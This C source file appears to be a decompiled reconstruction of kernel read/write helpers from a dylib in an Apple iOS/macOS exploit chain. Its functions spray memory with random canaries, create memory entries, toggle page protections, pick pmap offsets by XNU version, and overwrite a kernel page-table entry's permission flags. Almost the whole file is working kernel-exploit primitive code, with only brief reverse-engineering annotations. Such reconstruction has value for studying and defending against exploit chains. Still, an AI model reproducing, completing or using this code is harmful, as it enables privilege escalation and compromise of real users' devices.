/*
 * record_0x90000_kreadwrite_tier3.c
 * entry5_type0x09.dylib — tier-3 kread/kwrite helpers
 *
 * sub_11ba4  (FUN_00011ba4) — vm_region_64 probe for fd-pair primitive
 * sub_11e48  (FUN_00011e48) — arc4random canary + mach_make_memory_entry
 * sub_1209c  (FUN_0001209c) — vm_protect toggle (unmap/remap pages)
 * sub_121d4  (FUN_000121d4) — vm_map + madvise WILLNEED + vm_deallocate
 * sub_122d4  (FUN_000122d4) — version-dependent pmap offset selector
 * sub_125d8  (FUN_000125d8) — CFDictionary set integer value 0x20
 * sub_12660  (FUN_00012660) — pmap entry write via memory-entry vm_map
 * sub_12888  (FUN_00012888) — kread at version-dependent offset
 *
 * Verified: vm_region_64 call, mach_make_memory_entry, arc4random_buf,
 *           vm_protect toggle, madvise WILLNEED, CFNumber/CFDictionary ops,
 *           kaddr threshold checks, pmap offset table.
 * Inferred: role labels from call context and data flow.
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <CoreFoundation/CoreFoundation.h>

extern kern_return_t vm_region_64(vm_map_t, vm_address_t *, vm_size_t *,
                                   vm_region_flavor_t, vm_region_info_t,
                                   mach_msg_type_number_t *, mach_port_t *);
extern void arc4random_buf(void *, size_t);

/* kread/kwrite primitives */
extern int  sub_2667c(long state, uint64_t addr, uint32_t size, void *out);
extern int  sub_29ab4(long state, uint64_t addr, void **out);
extern int  sub_37238(long state, uint32_t mask);
extern int  sub_39a3c(long state, uint64_t addr);
extern int  sub_39d18(long state, uint64_t addr, void *out);
extern void sub_3a094(long state, void *buf);

/* ── sub_11ba4 — vm_region_64 probe ─────────────────────────────────────── */
/*
 * Probes a kernel address range using vm_region_64 with a temporarily
 * modified pointer table. Used to correlate fd-pair kernel objects.
 * param_1: state, param_2: base addr, param_3: probe addr, param_4: count
 */
void sub_11ba4(long param_1, long param_2, long param_3, uint32_t param_4)
{
    long *tbl = *(long **)(param_1 + 0x50);
    if (!tbl) return;

    long entry  = *(long *)(param_1 + 0x58);
    long saved1 = tbl[1];
    long saved3 = tbl[3];
    long saved_c8 = *(long *)(entry + 8);

    vm_size_t page_size = vm_page_size;
    vm_address_t probe_base = (vm_address_t)(tbl[3] - page_size);

    for (uint32_t i = 0; i < param_4; i++) {
        uint64_t off = (uint64_t)i * 8 + param_2;
        uint64_t mask = *(uint64_t *)(param_1 + 0x188);
        uint64_t probe = mask & (off + param_3);

        *(long *)(entry + 8) = tbl[1];

        madvise((void *)(*(long *)(param_1 + 0x2c20) - page_size),
                page_size * 2, MADV_FREE);

        /* try wide probe first */
        uint64_t wide_off = off - 0x4e;
        if ((uint64_t)*(uint32_t *)(param_1 + 0x180) >= probe + 0x40 &&
            probe + (uint64_t)param_4 <= (uint64_t)*(uint32_t *)(param_1 + 0x180)) {
            tbl[1] = (long)wide_off;
            tbl[3] = (long)probe_base;
        } else {
            tbl[1] = (long)(off - 0x10);
            tbl[3] = (long)probe_base;
        }

        vm_address_t addr = probe_base;
        vm_size_t size = 0;
        mach_msg_type_number_t cnt = 9;
        mach_port_t obj = MACH_PORT_NULL;
        int info[8] = {0};
        vm_region_64(mach_task_self(), &addr, &size, 9,
                     (vm_region_info_t)info, &cnt, &obj);

        tbl[1] = saved1;
        tbl[3] = saved3;
        *(long *)(entry + 8) = saved_c8;
        *(long *)(param_1 + 0x3468) += 1;
    }
}

/* ── sub_11e48 — arc4random canary + mach_make_memory_entry ─────────────── */
/*
 * Writes a random 64-bit canary into each page of the spray region,
 * then calls mach_make_memory_entry when the canary is found via kread.
 * param_1: state, param_2: spray context (long[])
 */
void sub_11e48(long param_1, long *param_2)
{
    vm_size_t page_size = vm_page_size;
    uint32_t page_shift = vm_page_shift;

    uint64_t canary = 0;
    arc4random_buf(&canary, 8);

    uint64_t flags = *(uint64_t *)(param_1 + 8);
    uint32_t max_pages = (flags >> 0x20) ? 0x80000 :
                         (flags >> 0x21) ? 0x40000 :
                         (flags >> 0x22) ? 0x100000 : 0x200000;

    vm_address_t base = *(vm_address_t *)(param_1 + 0x3488);
    long region_end   = *(long *)(param_1 + 0x3490);
    if (!base || !region_end) return;

    /* madvise WILLNEED on last page */
    madvise((void *)(base - page_size + region_end), page_size, MADV_WILLNEED);

    /* re-allocate region */
    vm_allocate(mach_task_self(), &base, (vm_size_t)(region_end - page_size),
                0xca000002 /* VM_FLAGS_FIXED|VM_FLAGS_OVERWRITE */);

    uint64_t bit_mask = param_2[3];
    uint32_t bit_count = param_2[4];

    for (uint32_t i = 0; i < max_pages; i++) {
        /* write canary + index into page */
        uint64_t *slot = (uint64_t *)(base + (uint64_t)page_size * (i & 0x7f));
        *slot = canary + i;
        __asm__ volatile("dsb sy" ::: "memory");

        if (!bit_count) continue;

        /* scan kread results for canary match */
        for (uint32_t b = 0; b < 64; b++) {
            if (bit_mask & (1ULL << b)) continue;
            long kaddr = param_2[0] + (long)((uint32_t)(b << page_shift));
            if (kaddr == (long)(canary + i)) {
                param_2[3] = bit_mask | (1ULL << b);
                mem_entry_name_port_t entry = MACH_PORT_NULL;
                vm_size_t esz = page_size;
                kern_return_t kr = mach_make_memory_entry(
                    mach_task_self(), &esz,
                    base + (uint64_t)page_size * (i & 0x7f),
                    0x200003 /* VM_PROT_READ|VM_PROT_WRITE|MAP_MEM_NAMED_CREATE */,
                    &entry, MACH_PORT_NULL);
                if (kr == 0)
                    *(mem_entry_name_port_t *)(param_2 + 5) = entry;
                else
                    *(mem_entry_name_port_t *)(param_2 + 5) = (uint32_t)(kr | 0x80000000);
                bit_count = param_2[4];
                break;
            }
        }
    }
}

/* ── sub_1209c — vm_protect toggle ──────────────────────────────────────── */
/*
 * For each unset bit in param_2[3], vm_protect the corresponding page
 * to PROT_NONE then back to PROT_READ|PROT_WRITE.
 */
void sub_1209c(int *param_1, long *param_2)
{
    vm_size_t page_size = vm_page_size;
    uint32_t page_shift = vm_page_shift;
    uint32_t bit_count = param_2[4];
    uint64_t bit_mask  = (uint64_t)param_2[3];

    /* skip if already fully mapped or mode==3 with count<=1 */
    uint32_t popcount = __builtin_popcountll(bit_mask);
    if (popcount == bit_count) return;
    if ((*param_1 == 3 && *(int *)((long)param_2 + 0x24) + 1 <= 1) ||
        !bit_count) return;

    for (uint32_t b = 0; b < bit_count; b++) {
        if (bit_mask & (1ULL << b)) continue;
        vm_address_t addr = (vm_address_t)(param_2[0] +
                            (long)((uint32_t)(b << (page_shift & 0x1f))));
        if (vm_protect(mach_task_self(), addr, page_size, 0, VM_PROT_NONE))
            return;
        if (vm_protect(mach_task_self(), addr, page_size, 0,
                       VM_PROT_READ | VM_PROT_WRITE))
            return;
        param_2[3] = (long)(bit_mask | (1ULL << b));
        bit_mask = (uint64_t)param_2[3];
        bit_count = param_2[4];
    }
}

/* ── sub_121d4 — vm_map + madvise WILLNEED + vm_deallocate ──────────────── */
/*
 * Maps the memory entry at param_1+0x34f0, calls madvise WILLNEED,
 * then vm_deallocates the mapping.
 */
void sub_121d4(long param_1)
{
    mem_entry_name_port_t entry =
        *(mem_entry_name_port_t *)(param_1 + 0x34f0);
    if (entry + 1 < 2) return;

    vm_address_t addr = 0;
    vm_size_t size = vm_page_size;
    kern_return_t kr = vm_map(mach_task_self(), &addr, size, 0, 1,
                               entry, 0, 0,
                               VM_PROT_READ | VM_PROT_WRITE,
                               VM_PROT_ALL, VM_INHERIT_NONE);
    if (kr != 0) return;

    if (madvise((void *)addr, size, MADV_WILLNEED) != 0) {
        /* log errno but continue */
    }
    vm_deallocate(mach_task_self(), addr, size);
}

/* ── sub_122d4 — version-dependent pmap offset selector ─────────────────── */
/*
 * Returns the pmap field offset for the current kernel version.
 * param_1: state, param_2: base kaddr, param_3: unused, param_4: out offset
 */
void sub_122d4(long param_1, long param_2, uint64_t param_3, uint64_t *param_4)
{
    uint64_t kaddr = *(uint64_t *)(param_1 + 0x158);
    long off;

    if (kaddr < 0x27120080d00000ULL) {
        /* older path */
        off = (kaddr < 0x1f530f02800000ULL) ? 0x100 : 0xf8;
    } else {
        off = 0xf8;
    }

    if (param_4) *param_4 = (uint64_t)(param_2 + off);
}

/* ── sub_125d8 — CFDictionary set integer value 0x20 ────────────────────── */
void sub_125d8(CFMutableDictionaryRef dict, CFStringRef key)
{
    int32_t val = 0x20;
    CFNumberRef n = CFNumberCreate(NULL, kCFNumberSInt32Type, &val);
    CFDictionarySetValue(dict, key, n);
    CFRelease(n);
}

/* ── sub_12660 — pmap entry write via memory-entry vm_map ───────────────── */
/*
 * Writes a pmap permission flag into the kernel pmap entry.
 * Uses the memory-entry port at state+0x58 (if valid) or sub_39d18.
 * param_1: state, param_2: pmap context, param_3: target kaddr
 */
void sub_12660(long param_1, long param_2, uint64_t param_3)
{
    uint64_t mask = *(uint64_t *)(param_1 + 0x188);

    /* kread the pmap entry pointer */
    uint64_t page_shift = vm_page_shift;
    uint64_t idx = ((param_3 - *(long *)(param_2 + 0x3500)) >> page_shift) * 8;
    uint64_t entry_kaddr = *(long *)(param_2 + 0x3508) + (long)idx;

    uint64_t pte = 0;
    int rc = sub_2667c(param_1, entry_kaddr, 8, &pte);
    if (rc || (pte & 3) != 0) return;  /* not a valid PTE */

    /* check if 0x8000 flag needed */
    long stride = sub_37238(param_1, 0x8000) ? 0x20 : 8;

    /* get pmap pointer */
    void *pmap_ptr = NULL;
    rc = sub_29ab4(param_1, (pte & 0xfffffffffffc) + stride - 0x18, &pmap_ptr);
    if (!rc || !pmap_ptr) return;

    /* get page table entry address */
    uint64_t pte_addr = sub_39a3c(param_1,
        (uint64_t)pmap_ptr + (param_3 >> 10 & 0xc));
    if (!pte_addr) return;

    vm_address_t mapped = 0;
    vm_size_t page_size = vm_page_size;
    mem_entry_name_port_t mem_entry =
        *(mem_entry_name_port_t *)(param_1 + 0x58);

    if (mem_entry + 1 < 2) {
        /* use sub_39d18 fallback */
        vm_address_t buf[7] = {0};
        rc = sub_39d18(param_1, pte_addr, buf);
        if (rc) return;
        mapped = buf[0];
    } else {
        kern_return_t kr = vm_map(mach_task_self(), &mapped, page_size, 0, 1,
                                   mem_entry,
                                   pte_addr & ~(mask ^ 0xffffffffffffffffULL),
                                   0, VM_PROT_READ | VM_PROT_WRITE,
                                   VM_PROT_ALL, VM_INHERIT_NONE);
        if (kr) return;
    }

    /* atomic decrement + set 0x4000 flag */
    volatile int16_t *slot = (volatile int16_t *)
        ((mapped & mask & pte_addr) + mapped);
    if (*slot != 0) {
        int16_t old;
        do {
            old = __atomic_load_n(slot, __ATOMIC_ACQUIRE);
            if (!old) break;
        } while (!__atomic_compare_exchange_n(slot, &old, (int16_t)(old - 1),
                                               0, __ATOMIC_RELEASE,
                                               __ATOMIC_RELAXED));
        slot[1] = 0x4000;
    }

    if (mem_entry + 1 < 2)
        sub_3a094(param_1, (void *)mapped);
    else
        vm_deallocate(mach_task_self(), mapped, page_size);
}

/* ── sub_12888 — kread at version-dependent offset ──────────────────────── */
/*
 * Reads a kernel value at param_2 + version-dependent offset.
 * param_1: state, param_2: base kaddr, param_3: output
 */
void sub_12888(long param_1, long param_2, uint64_t *param_3)
{
    int xnu = *(int *)(param_1 + 0x140);
    long off;

    if (xnu < 0x2258) {
        if (xnu - 0x1f53 > 1) {
            if (xnu != 0x1c1b) return;
            off = 0xf8;
        } else {
            off = (*(uint64_t *)(param_1 + 0x158) < 0x1f530f02800000ULL)
                  ? 0x100 : 0xf8;
        }
    } else {
        if (xnu != 0x225c && xnu != 0x2258) return;
        off = (*(uint64_t *)(param_1 + 0x158) < 0x1f530f02800000ULL)
              ? 0x100 : 0xf8;
    }

    uint64_t result = 0;
    int rc = sub_29ab4(param_1, (uint64_t)(param_2 + off), (void **)&result);
    if (rc && param_3) *param_3 = result;
}
